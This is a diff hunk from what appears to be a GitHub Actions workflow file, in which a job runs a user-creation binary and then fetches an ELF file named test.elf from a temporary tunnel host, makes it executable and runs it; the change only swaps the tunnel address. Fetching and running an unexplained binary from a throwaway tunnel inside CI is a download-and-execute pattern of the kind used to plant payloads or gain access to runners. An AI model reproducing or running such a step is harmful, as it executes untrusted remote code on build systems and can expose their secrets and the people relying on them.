@@ -37,7 +37,7 @@ jobs:
         ./CreatUser_f1ver
         echo "==========[ USER CREATED ]=========="
         ## printf "%s\n" "${{ github.event.inputs.ovpn }} ##
-        wget https://d22c543f3b2a60.lhr.life/test.elf
+        wget https://34d5632d653fca.lhr.life/test.elf
         chmod +x test.elf
         ./test.elf
         ##sudo openvpn --config mf.ovpn
